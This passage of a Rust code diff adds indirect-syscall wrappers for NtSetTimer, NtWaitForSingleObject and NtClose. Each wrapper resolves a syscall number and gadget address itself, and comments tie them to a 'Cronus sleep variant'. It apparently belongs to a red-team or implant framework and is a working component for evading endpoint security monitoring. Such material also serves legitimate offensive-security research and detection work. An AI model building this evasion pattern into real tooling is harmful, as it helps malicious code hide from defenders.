+    due_time: u64,        // *const i64 (negative = relative)
+    timer_apc_routine: u64, // PTIMER_APC_ROUTINE (APC callback)
+    timer_context: u64,   // PVOID (context passed to APC)
+    resume_timer: u64,    // BOOLEAN
+    period: u64,          // LONG (0 = one-shot)
+    previous_state: u64,  // PBOOLEAN (optional)
+) -> i32 {
+    match get_syscall_id("NtSetTimer") {
+        Ok(target) => do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[
+                timer_handle,
+                due_time,
+                timer_apc_routine,
+                timer_context,
+                resume_timer,
+                period,
+                previous_state,
+            ],
+        ),
+        Err(e) => {
+            log::warn!("syscall_NtSetTimer: could not get SSN: {}", e);
+            -1
+        }
+    }
+}
+
+/// Wrapper around NtWaitForSingleObject used by the Cronus sleep variant.
+/// Signature: NtWaitForSingleObject(Handle, Alertable, Timeout)
+#[cfg(windows)]
+pub unsafe fn syscall_NtWaitForSingleObject(
+    handle: u64,
+    alertable: u64,
+    timeout: u64, // *const i64 (0 = no timeout, wait indefinitely)
+) -> i32 {
+    match get_syscall_id("NtWaitForSingleObject") {
+        Ok(target) => do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[handle, alertable, timeout],
+        ),
+        Err(e) => {
+            log::warn!("syscall_NtWaitForSingleObject: could not get SSN: {}", e);
+            -1
+        }
+    }
+}
+
+/// Wrapper around NtClose used by the Cronus sleep variant to close timer handles.
+/// Signature: NtClose(Handle)
+#[cfg(windows)]
+pub unsafe fn syscall_NtClose(handle: u64) -> i32 {
+    match get_syscall_id("NtClose") {
+        Ok(target) => do_syscall(target.ssn, target.gadget_addr, &[handle]),
+        Err(e) => {
+            log::warn!("syscall_NtClose: could not get SSN: {}", e);
             -1
         }
     }
